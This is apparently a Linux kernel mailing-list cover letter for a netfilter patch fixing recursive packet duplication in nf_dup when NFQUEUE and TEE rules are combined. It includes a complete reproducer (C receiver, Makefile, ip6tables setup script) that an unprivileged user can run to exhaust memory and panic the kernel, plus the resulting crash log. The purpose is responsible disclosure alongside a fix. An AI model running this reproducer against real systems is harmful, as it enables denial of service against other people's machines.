Received: from mail-pj1-f49.google.com (mail-pj1-f49.google.com [209.85.216.49])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0646F338910
	for <netfilter-devel@vger.kernel.org>; Sat, 29 Aug 2026 05:19:17 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.49
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787980759; cv=none; b=BWGPbDGlSjZqI7DxO6nB1Hye2MWzeVvOJ4FoB11k9dme42UH8WD6QRUxJTWVMQrPXAYybI3JuIpIbedYwPzl3McGz44UZb6rOlom/uKdZ9af/ZjPiV+JelPaWrROMtyRH5Oe3C59pZK9fJK0PBTpgiKpEeMjdYwu7l6Z0SL4cTg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787980759; c=relaxed/simple;
	bh=LjAaMPDOro3SAjWT5NojqacgBdYWrv2RwNuC5XVfSTs=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UrG078oj1GI/iIpFtpAO8yuEX8oNfY9ZoKKPVIei6n4Divuo7SanRQY1x2pjZ36QRlhljdThoEQgQsmjWGQl4yVxnvIzw5oNpiCSvpTRgm7tGOZysRaVcruKAmkGWqfhn4B5c0TSe46JhQ0dZU5C4iHxtaKsN9oWYErJM4eWCek=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=QFCC7d9H; arc=none smtp.client-ip=209.85.216.49
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="QFCC7d9H"
Received: by mail-pj1-f49.google.com with SMTP id 98e67ed59e1d1-3964e480f76so2156607a91.1
        for <netfilter-devel@vger.kernel.org>; Fri, 28 Aug 2026 22:19:17 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787980757; x=1788585557; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=n8Rgaad8Uc+ON6FjsUCmx2OBDPd9ZDG5g1xK9ARAetQ=;
        b=QFCC7d9H/OMXGkFLKHF9TZfkp6GIuyOeE9aNKbfIlNDxw5iZ2ema8tuuw2CCskrs6Z
         c7oJoNKhCL6FChBIyOOJLu6GZwk4V9Jw20LfTq0vy0uX3j7MBqd++tp+1pvbOdq/MCmt
         HkKiFSJQorYTBUAEpmTcdrDXFvOqDvgCD5K1Gg5usmx2dRfFzJ28QTD9vPUbJP5OR/yN
         1SOg8DpRLolzW2oihDQIFJwergy8XWhRdZneWENSWOLM6ptIQuHu2TyaKN67elRS2OkD
         9Htky1wUEmXhctXkAVi8C7e4RlzgH6yWSWbBnaQXR4vA5S4UFJcAkmE470GUbVAL/frh
         WNsw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787980757; x=1788585557;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=n8Rgaad8Uc+ON6FjsUCmx2OBDPd9ZDG5g1xK9ARAetQ=;
        b=ThuSNAiU5aBtu7XZ/ddM7T9Csyb9vU5baViBIx4JJoVBeqZi4M/Txwq0dDIUjj/gvc
         2nMSp7ojhHv/w0K4JcZ7D1PCAAmf0yImM15Uf7VUuq58PK/SpKUcb48hsBBilPGf1Ssp
         3Fpn2gn2zax3hWG30ykra3Y7ZH0qF0b0/6O7iYLQtAGsrhyLXrGDf8RgpH7s/eqY0E4b
         L03sdAFycIibOuzIUy/oyPYVAs97PRqHcjGikzBkE+3URMVerMehSu3CZolQXisTSFOC
         1Tb+CegFVcO/Jxejh2chdPTUUpefhYEyUKyd2ID195CkA2FwPAQuPdR4c6xkXo5+eN8O
         eqMQ==
X-Forwarded-Encrypted: i=1; AKwUvBxNynLxSFLmY2ZrhP3w/vdcmpmrLvJTSvtP/TiZ3ZIHN21SI66jitZZjYw2eyMpLgyVqSnn2lk4ioYoOqR20mQ=@vger.kernel.org
X-Gm-Message-State: AFuF++lmt8LoayIJ73ad0vMU5rnchm7e1Nwcc1WeGdHP41jOvYrPpBnM
	iZ08Gn+DzUSQTEqyUvn5bfBGkI2TPCx77oY+UlPA5A40nuQpcuuYakofesVQgGFLXhoWsekBbBu
	VaZ73Hj6uiPU=
X-Gm-Gg: AYBFou0Lgt3BP00y+8DxbVv2sylVDkh6mit9Q/DVHlh7b0b1CNs3Qz09tED+4Dj8Fna
	QF+jf+rP2p++VFZ0IiqXJpuDGJ4Wttf6W6FUZ5Ii9C3JzXB91y8bW0OMWwnu5co65LONcSsLzHf
	2fBuURN0rv33dDiAy5GVxu80dzfpgbXfVIIGA8kXvVxb5HaOeYOhyHHpMsfGD3ovp7i74zCLuSq
	5PtcAyDzkQGjMdp3wbxKw5j/+QZwapuAjmu11qZkILlaSa20YaD2PMFJMME+DP8/CBBP7Yw+DqY
	LYn5c9AuJit2u5FRuG6CAaRZk8J0D+ugeFjLgoap84tE8CKdI/vrqzD1KoKqu3QZJTwvG+41lRS
	Lwv75EpHDF4nIBhC9ZF1PkkMo4SPx8QQRQto69cm71W2v6TV0JRa3R3JDsVW1YyjEKehb2ut1Rb
	ROuPb1gFduMxOcVyNJeH96G6VRKjLrQMvZX9Aqniw+BnzZYCOIH5zipDAJcRqrdOzoHXabLrr9Y
	wJ7f5gOx7s47rI=
X-Received: by 2002:a17:90b:5102:b0:38e:70d5:b12d with SMTP id 98e67ed59e1d1-396d0ea862fmr22395949a91.6.1787980757021;
        Fri, 28 Aug 2026 22:19:17 -0700 (PDT)
Received: from gmail.com ([202.201.12.230])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-396dda7c922sm5569572a91.7.2026.08.28.22.19.11
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 28 Aug 2026 22:19:16 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Pablo Neira Ayuso <pablo@netfilter.org>,
	Florian Westphal <fw@strlen.de>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>
Cc: Phil Sutter <phil@nwl.cc>,
	Simon Horman <horms@kernel.org>,
	netfilter-devel@vger.kernel.org,
	netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	coreteam@netfilter.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH nf 0/1] netfilter: nf_dup: prevent asynchronous duplicate recursion
Date: Sat, 29 Aug 2026 05:19:02 +0000
Message-ID: <cover.1787903722.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv6/netfilter/nf_dup_ipv6.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

nf_dup_ipv4() and nf_dup_ipv6() prevent recursive TEE targets and nftables
dup expressions only with current->in_nf_duplicate. The flag covers the
synchronous ip_local_out() or ip6_local_out() call, but it is cleared when
the output function returns.

An earlier NFQUEUE hook can retain the cloned skb while letting the output
function return. A later NF_ACCEPT verdict resumes the same skb at the hook
after the queueing rule, under the verdict task and after the task flag was
cleared. A later TEE target or dup expression can therefore clone it again.
An earlier queue hook and a later duplication hook form an unbounded packet
generation loop. The same root cause is reachable through IPv4, IPv6,
xtables, nftables, and mixed frontend rule sets.

The patch records the duplication state in the cloned skb and rejects a
second duplication when either the task or skb guard is set. Normal skb
header copies retain the bit, while nf_copy() propagates it to IPv4 and IPv6
fragments. The task flag remains in place for synchronous recursion and the
alternate xtables jumpstack.

The root cause predates the later helper extraction and nftables caller.
Commit cd58bcd9787e ("netfilter: xt_TEE: have cloned packet travel through
Xtables too") changed TEE clones from direct ip_output()/ip6_output() to
ip_local_out()/ip6_local_out() and introduced a transient tee_active guard.
Its parent bypassed clone traversal through Xtables, so the current
queue-after-guard-lifetime state did not exist there. Commit bbde9fc1824a
factored the logic into nf_dup_ipv4()/nf_dup_ipv6(), commit d877f07112f1
added nftables dup callers, and commit a1f1acb9c5db moved the same transient
guard into task_struct. Those later commits preserved or widened the older
root cause, so the Fixes tag points to cd58bcd9787e.

The crash log below was produced by the unpatched baseline during a root run
of this reproducer. It was decoded with decode_stacktrace.sh using the
matching vmlinux, so source file and line information is included.

Reproducer:

    make
    PANIC_ON_OOM=0 QUEUE_COUNT=1 TEE_CLONES=1 PAYLOAD=1 \
        bash ./poc.sh --userns

The complete multi-file reproducer uses libnetfilter_queue. The Makefile
links the receiver with -lnetfilter_queue -lnfnetlink; poc.sh installs the
NFQUEUE and TEE rules and sends the IPv6 UDP traffic. The two-line template
shorthand below is receiver-only reference, not the complete trigger. It
does not install rules or send traffic, and the standalone receiver also
requires the two libraries above:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

The crash run used:

    PANIC_ON_OOM=1 bash ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
This describes both the controlled comparison and the crash run. The crash
log reports CPU: 1, consistent with the 2-vCPU guest.

packetdrill was not used because the trigger requires a userspace
libnetfilter_queue verdict service together with ip6tables NFQUEUE/TEE rule
installation, which packetdrill cannot express by itself.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/netfilter.h>
#include <linux/netlink.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include <libnetfilter_queue/libnetfilter_queue.h>

static volatile sig_atomic_t stop;
static uint64_t packets_seen;
static uint64_t last_report;
static struct timespec start_ts;

static void on_signal(int signo)
{
	(void)signo;
	stop = 1;
}

static void report_progress(bool force)
{
	struct timespec now;
	double seconds;

	if (!force && packets_seen - last_report < 1000)
		return;

	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
		return;

	seconds = (now.tv_sec - start_ts.tv_sec) +
		  (now.tv_nsec - start_ts.tv_nsec) / 1000000000.0;
	fprintf(stderr, "accepted=%llu elapsed=%.3f rate=%.0f pkt/s\n",
		(unsigned long long)packets_seen, seconds,
		seconds > 0.0 ? packets_seen / seconds : 0.0);
	last_report = packets_seen;
}

static int queue_cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
		    struct nfq_data *nfa, void *data)
{
	struct nfqnl_msg_packet_hdr *ph;
	uint32_t id = 0;

	(void)nfmsg;
	(void)data;

	ph = nfq_get_msg_packet_hdr(nfa);
	if (ph)
		id = ntohl(ph->packet_id);

	packets_seen++;
	report_progress(false);

	return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

int main(int argc, char **argv)
{
	struct nfq_handle *h = NULL;
	struct nfq_q_handle *qh = NULL;
	int fd;
	int queue_num = 0;
	int rv;
	int ret = 1;
	int one = 1;
	int rcvbuf = 512 * 1024 * 1024;
	unsigned int maxlen = 65535;
	char buf[8192] __attribute__((aligned));

	if (argc > 2) {
		fprintf(stderr, "usage: %s [queue-num]\n", argv[0]);
		return 2;
	}
	if (argc == 2)
		queue_num = atoi(argv[1]);

	signal(SIGINT, on_signal);
	signal(SIGTERM, on_signal);

	if (clock_gettime(CLOCK_MONOTONIC, &start_ts) != 0) {
		perror("clock_gettime");
		return 1;
	}

	h = nfq_open();
	if (!h) {
		perror("nfq_open");
		goto out;
	}

	if (nfq_unbind_pf(h, AF_INET6) < 0)
		fprintf(stderr, "warning: nfq_unbind_pf(AF_INET6) failed\n");

	if (nfq_bind_pf(h, AF_INET6) < 0) {
		perror("nfq_bind_pf(AF_INET6)");
		goto out;
	}

	qh = nfq_create_queue(h, (uint16_t)queue_num, queue_cb, NULL);
	if (!qh) {
		perror("nfq_create_queue");
		goto out;
	}

	if (nfq_set_mode(qh, NFQNL_COPY_META, 0) < 0) {
		perror("nfq_set_mode");
		goto out;
	}

	if (nfq_set_queue_maxlen(qh, maxlen) < 0)
		fprintf(stderr, "warning: nfq_set_queue_maxlen(%u) failed\n", maxlen);

	fd = nfq_fd(h);
	if (setsockopt(fd, SOL_SOCKET, SO_RCVBUFFORCE, &rcvbuf,
		       sizeof(rcvbuf)) < 0 &&
	    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0)
		fprintf(stderr, "warning: socket receive buffer setup failed: %s\n",
			strerror(errno));
	if (setsockopt(fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &one, sizeof(one)) < 0)
		fprintf(stderr, "warning: NETLINK_NO_ENOBUFS failed: %s\n",
			strerror(errno));

	while (!stop) {
		rv = recv(fd, buf, sizeof(buf), 0);
		if (rv >= 0) {
			if (nfq_handle_packet(h, buf, rv) < 0) {
				perror("nfq_handle_packet");
				break;
			}
			continue;
		}

		if (errno == EINTR)
			continue;
		if (errno == ENOBUFS)
			continue;

		perror("recv");
		break;
	}

	report_progress(true);
	ret = 0;

out:
	if (qh)
		nfq_destroy_queue(qh);
	if (h)
		nfq_close(h);
	return ret;
}
------END poc.c--------

------BEGIN Makefile------
CC ?= gcc
CFLAGS ?= -O2 -Wall -Wextra
LDLIBS ?= -lnetfilter_queue -lnfnetlink

all: poc

poc: poc.c

clean:
	rm -f poc
------END Makefile--------

------BEGIN poc.sh------
#!/bin/bash
set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
IP=/usr/sbin/ip
IP6TABLES=/usr/sbin/ip6tables-legacy
SYSCTL=/usr/sbin/sysctl
export XTABLES_LOCKFILE=${XTABLES_LOCKFILE:-$SCRIPT_DIR/xtables.lock}
QUEUE_COUNT=${QUEUE_COUNT:-18}
BASE_PORT=${BASE_PORT:-5555}
PAYLOAD=${PAYLOAD:-60000}
TEE_CLONES=${TEE_CLONES:-2}
PANIC_ON_OOM=${PANIC_ON_OOM:-1}
PANIC_ON_WARN=${PANIC_ON_WARN:-0}

if [[ ${1-} == "--userns" ]]; then
	exec unshare -Urn -- "$0" --inside-userns
fi

if [[ ${1-} == "--inside-userns" ]]; then
	shift
fi

cleanup() {
	"$IP6TABLES" -t raw -F OUTPUT 2>/dev/null || true
	"$IP6TABLES" -t mangle -F OUTPUT 2>/dev/null || true
	for pid in "${acceptor_pids[@]-}"; do
		kill "$pid" 2>/dev/null || true
	done
	for pid in "${acceptor_pids[@]-}"; do
		wait "$pid" 2>/dev/null || true
	done
}
trap cleanup EXIT

"$IP" link set lo up
"$SYSCTL" -q -w kernel.panic_on_warn="$PANIC_ON_WARN" || true
"$SYSCTL" -q -w vm.panic_on_oom="$PANIC_ON_OOM" || true
"$SYSCTL" -q -w net.core.rmem_max=536870912 || true
"$SYSCTL" -q -w net.core.rmem_default=536870912 || true
"$SYSCTL" -q -w net.netfilter.nf_queue_maxlen=65535 || true

make -C "$SCRIPT_DIR" clean all

"$IP6TABLES" -t raw -F OUTPUT
"$IP6TABLES" -t mangle -F OUTPUT

acceptor_pids=()

for q in $(seq 0 $((QUEUE_COUNT - 1))); do
	port=$((BASE_PORT + q))

	"$IP6TABLES" -t raw -A OUTPUT \
		-p udp -d ::1 --dport "$port" \
		-j NFQUEUE --queue-num "$q"

	for _ in $(seq 1 "$TEE_CLONES"); do
		"$IP6TABLES" -t mangle -A OUTPUT \
			-p udp -d ::1 --dport "$port" \
			-j TEE --gateway ::1 --oif lo
	done

	"$SCRIPT_DIR/poc" "$q" >"$SCRIPT_DIR/acceptor-$q.log" 2>&1 &
	acceptor_pids+=("$!")
done
sleep 1

python3 - "$BASE_PORT" "$QUEUE_COUNT" "$PAYLOAD" <<'PY'
import socket
import sys

base_port = int(sys.argv[1])
queue_count = int(sys.argv[2])
payload_len = int(sys.argv[3])

s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
for offset in range(queue_count):
	dport = base_port + offset
	s.sendto(b"A" * payload_len, ("::1", dport))
	print("sent", payload_len, "bytes to ::1", dport)
PY

echo "PoC is active. Queue state:"
cat /proc/net/netfilter/nfnetlink_queue 2>/dev/null || true

wait
------END poc.sh--------

----BEGIN crash log----
[   41.727564] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[   41.749001] CPU: 1 UID: 0 PID: 91 Comm: systemd-journal Not tainted 7.2.0-07242-g7cbfb180945c #1 PREEMPT(lazy) 
[   41.774942] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   41.804442] Call Trace:
[   41.810996]  <TASK>
[   41.817782]  vpanic (kernel/panic.c:651)
[   41.827657]  panic (kernel/panic.c:788)
[   41.837426]  out_of_memory (mm/oom_kill.c:1076 (discriminator 4) mm/oom_kill.c:1143 (discriminator 4))
[   41.849070]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4116 mm/page_alloc.c:4967 mm/page_alloc.c:5317)
[   41.864629]  ? blk_finish_plug (block/blk-core.c:1293)
[   41.878318]  alloc_pages_mpol (mm/mempolicy.c:2490)
[   41.893205]  folio_alloc_noprof (mm/mempolicy.c:2561 (discriminator 1) mm/mempolicy.c:2581 (discriminator 1) mm/mempolicy.c:2591 (discriminator 1))
[   41.907427]  __filemap_get_folio_mpol (mm/filemap.c:2018 (discriminator 2))
[   41.925721]  filemap_fault (include/linux/pagemap.h:761 mm/filemap.c:3598)
[   41.938653]  __do_fault (mm/memory.c:5425)
[   41.950917]  __handle_mm_fault (mm/memory.c:5860 mm/memory.c:5994 mm/memory.c:4566 mm/memory.c:6379 mm/memory.c:6517)
[   41.966132]  handle_mm_fault (mm/memory.c:6686)
[   41.980871]  do_user_addr_fault (arch/x86/mm/fault.c:1343)
[   41.993516]  exc_page_fault (arch/x86/mm/fault.c:1483 arch/x86/mm/fault.c:1536)
[   42.007098]  asm_exc_page_fault (arch/x86/include/asm/idtentry.h:595)
[   42.020389] RIP: 0033:0x7f85625ebff9
[   42.034319] Code: Unable to access opcode bytes at 0x7f85625ebfcf.

Code starting with the faulting instruction
===========================================
[   42.054294] RSP: 002b:00007ffc20d6b660 EFLAGS: 00010202
[   42.072734] RAX: 0000000000000001 RBX: 000055b7f426f600 RCX: 00007f8562328df6
[   42.090030] RDX: 0000000000000013 RSI: 000055b7f4277030 RDI: 0000000000000000
[   42.108167] RBP: ffffffffffffffff R08: 0000000000000000 R09: 00007f85626c8000
[   42.131161] R10: 00000000ffffffff R11: 0000000000000000 R12: 0000000000000001
[   42.153849] R13: 0000000000000013 R14: 0000000000000000 R15: 0000000000000000
[   42.180119]  </TASK>
[   42.188961] Kernel Offset: 0x24000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   42.228760] ---[ end Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled ]---
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  netfilter: nf_dup: prevent asynchronous duplicate recursion

 include/linux/skbuff.h           | 7 +++++++
 net/ipv4/netfilter/nf_dup_ipv4.c | 3 ++-
 net/ipv6/netfilter/nf_dup_ipv6.c | 3 ++-
 3 files changed, 11 insertions(+), 2 deletions(-)

-- 
2.43.0

